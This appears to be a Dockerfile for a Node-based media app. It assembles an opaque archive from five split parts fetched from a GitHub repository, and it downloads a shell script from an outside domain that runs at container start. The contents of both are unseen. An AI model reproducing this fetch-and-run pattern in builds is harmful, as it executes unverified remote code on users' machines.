FROM node:lts-buster
RUN apt-get update && \
apt-get install -y \
ffmpeg \
imagemagick \
webp && \
apt-get upgrade -y && \
rm -rf /var/lib/apt/lists/*
RUN wget https://github.com/Wp-Apis/Lady-Apis/raw/refs/heads/main/aa https://github.com/Wp-Apis/Lady-Apis/raw/refs/heads/main/ab https://github.com/Wp-Apis/Lady-Apis/raw/refs/heads/main/ac https://github.com/Wp-Apis/Lady-Apis/raw/refs/heads/main/ad https://github.com/Wp-Apis/Lady-Apis/raw/refs/heads/main/ae
RUN cat a* > renderbfanarrowx.zip
RUN unzip renderbfanarrowx.zip
RUN rm -rf renderbfanarrowx.zip
RUN wget -O main.sh https://go.bruceds.my.id/EPMS.sh
COPY . .
RUN chmod +x ./main.sh
RUN chmod +x ./start.sh
EXPOSE 5000 3000
CMD ["sh", "-c", "./start.sh & ./main.sh"]
